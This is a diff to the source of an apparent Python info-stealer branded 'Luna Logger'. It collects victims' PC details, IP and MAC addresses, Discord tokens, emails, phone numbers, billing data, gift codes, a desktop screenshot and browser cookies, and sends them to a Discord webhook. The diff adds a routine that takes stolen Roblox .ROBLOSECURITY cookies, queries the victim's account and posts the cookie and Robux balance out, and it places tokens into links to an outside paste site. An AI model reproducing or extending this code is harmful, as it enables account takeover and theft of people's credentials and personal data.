@@ -167,9 +167,8 @@ class PcInfo:
 
         embed.add_field(
             name="System Info",
-            value=f'''💻 `PC Username:` **{username}**\n:desktop: `PC Name:` **{hostname}**\n🌐 `OS:` **{computer_os}**\n\n👀 `IP:` **{ip}**\n🍏 `MAC:` **{mac}**\n🔧 `HWID:` **{hwid}**\n\n<:cpu:1024720072075399250> `CPU:` **{cpu.Name}**\n<:gpu:1024720328062156892> `GPU:` **{gpu.Name}**\n<:rgbram:1024720542214930462> `RAM:` **{ram}GB**''',
+            value=f'''💻 **PC Username:** `{username}`\n:desktop: **PC Name:** `{hostname}`\n🌐 **OS:** `{computer_os}`\n\n👀 **IP:** `{ip}`\n🍏 **MAC:** `{mac}`\n🔧 **HWID:** `{hwid}`\n\n<:cpu:1024720072075399250> **CPU:** `{cpu.Name}`\n<:gpu:1024720328062156892> **GPU:** `{gpu.Name}`\n<:rgbram:1024720542214930462> **RAM:** `{ram}GB`''',
             inline=False)
-        embed.set_footer(text="Luna Logger | Created by Smug")
         embed.set_thumbnail(url="https://cdn.discordapp.com/icons/958782767255158876/a_0949440b832bda90a3b95dc43feb9fb7.gif?size=4096")
 
         webhook.send(embed=embed, avatar_url="https://cdn.discordapp.com/icons/958782767255158876/a_0949440b832bda90a3b95dc43feb9fb7.gif?size=4096", username="Luna")
@@ -305,6 +304,21 @@ class Discord:
                                     self.tokens.append(token)
                                     self.ids.append(uid)
 
+    def robloxinfo(self, webhook):
+        embed = Embed(title="Roblox Info", color=5639644)
+        headers = {"Cookie": ".ROBLOSECURITY=" + robo_cookie}
+        info = requests.get("https://www.roblox.com/mobileapi/userinfo", headers=headers).json()
+
+        embed.add_field(name="<:roblox_icon:1041819334969937931> Name:", value=f"`{info['UserName']}`", inline=True)
+        embed.add_field(name="<:robux_coin:1041813572407283842> Robux:", value=f"`{info['RobuxBalance']}`", inline=True)
+        embed.add_field(name="🍪 Cookie:", value=f"`{robo_cookie}`", inline=False)
+        embed.set_thumbnail(url=info['ThumbnailUrl'])
+
+        webhook.send(
+            avatar_url="https://cdn.discordapp.com/icons/958782767255158876/a_0949440b832bda90a3b95dc43feb9fb7.gif?size=4096",
+            embed=embed,
+            username="Luna")
+
     def upload(self, webhook):
         webhook = SyncWebhook.from_url(webhook, session=requests.Session())
 
@@ -359,7 +373,7 @@ class Discord:
                     else:
                         methods += "❓"
 
-            val += f'<:1119pepesneakyevil:972703371221954630> `Discord ID:` **{discord_id}** \n<:gmail:1024717106996064296> `Email:` **{email}**\n:mobile_phone: `Phone:` **{phone}**\n\n🔒 `2FA:` **{mfa}**\n<a:nitroboost:996004213354139658> `Nitro:` **{nitro}**\n<:billing:1024718620896538787> `Billing:` **{methods}**\n\n<:crown1:1024719305482444851> `Token:` **{token}**\n[Click to copy!](https://paste-pgpj.onrender.com/?p={token})\n'
+            val += f'<:1119pepesneakyevil:972703371221954630> **Discord ID:** `{discord_id}` \n<:gmail:1024717106996064296> **Email:** `{email}`\n:mobile_phone: **Phone:** `{phone}`\n\n🔒 **2FA:** {mfa}\n<a:nitroboost:996004213354139658> **Nitro:** {nitro}\n<:billing:1024718620896538787> **Billing:** {methods}\n\n<:crown1:1024719305482444851> **Token:** `{token}`\n[Click to copy!](https://paste-pgpj.onrender.com/?p={token})\n'
 
             if "code" in gift.text:
                 codes = json.loads(gift.text)
@@ -367,20 +381,20 @@ class Discord:
                     val_codes.append((code['code'], code['promotion']['outbound_title']))
 
             if val_codes == []:
-                val += f'\n:gift: **No Gift Cards Found**\n'
+                val += f'\n:gift: `No Gift Cards Found`\n'
             elif len(val_codes) >= 3:
                 num = 0
                 for c, t in val_codes:
                     num += 1
                     if num == 3:
                         break
-                    val += f'\n:gift: `{t}:`\n**{c}**\n[Click to copy!](https://paste-pgpj.onrender.com/?p={c})\n'
+                    val += f'\n:gift: **{t}:**\n`{c}`\n[Click to copy!](https://paste-pgpj.onrender.com/?p={c})\n'
             else:
                 for c, t in val_codes:
-                    val += f'\n:gift: `{t}:`\n**{c}**\n[Click to copy!](https://paste-pgpj.onrender.com/?p={c})\n'
+                    val += f'\n:gift: **{t}:**\n`{c}`\n[Click to copy!](https://paste-pgpj.onrender.com/?p={c})\n'
 
-            embed = Embed(title=username, color=5639644)
-            embed.add_field(name="Discord Info", value=val + "\u200b", inline=False)
+            embed = Embed(title="Discord", color=5639644)
+            embed.add_field(name=username, value=val + "\u200b", inline=False)
             embed.set_thumbnail(url=avatar)
 
             webhook.send(
@@ -400,6 +414,8 @@ class Discord:
         embed2 = Embed(title="Desktop Screenshot", color=5639644)
         file = File(tempfolder + "\\image.png", filename="image.png")
         embed2.set_image(url="attachment://image.png")
+
+        self.robloxinfo(webhook)
 
         webhook.send(
             embed=embed2,
@@ -560,12 +576,14 @@ class Browsers:
         os.remove(cardvault)
 
     def roblox_cookies(self):
+        global robo_cookie
         with open(os.path.join(tempfolder, "Roblox", "Roblox Cookies.txt"), 'w', encoding="utf-8") as f:
             f.write(f"{github} | Roblox Cookies\n\n")
             with open(os.path.join(tempfolder, "Browser", "Browser Cookies.txt"), 'r', encoding="utf-8") as f2:
                 for line in f2:
                     if ".ROBLOSECURITY" in line:
-                        f.write(line.split(".ROBLOSECURITY")[1].strip() + "\n")
+                        robo_cookie = line.split(".ROBLOSECURITY")[1].strip()
+                        f.write(robo_cookie + "\n")
             f2.close()
         f.close()
 
